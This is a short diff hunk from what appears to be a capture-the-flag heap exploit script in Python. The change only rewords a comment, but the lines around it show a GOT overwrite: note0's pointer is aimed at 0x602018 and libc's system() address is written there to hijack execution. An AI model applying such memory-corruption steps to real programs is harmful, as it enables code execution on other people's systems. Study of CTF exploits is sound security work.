@@ -210,7 +210,7 @@ if __name__ == "__main__":
 
     raw_input('after editing note_0->ptr to 0x602018...')
 
-    # we have overwritten note0->size to 8, so realloc() won't come into play. that's a good thing.
+    # we have overwritten note0->size to 8, to prevent realloc() coming into play. that's a good thing.
     # and no need to add 3-qword prefix because note0->ptr points the exact target position.
 
     edit_note(0, 8, p64(libc_base+libc.symbols['system']))       
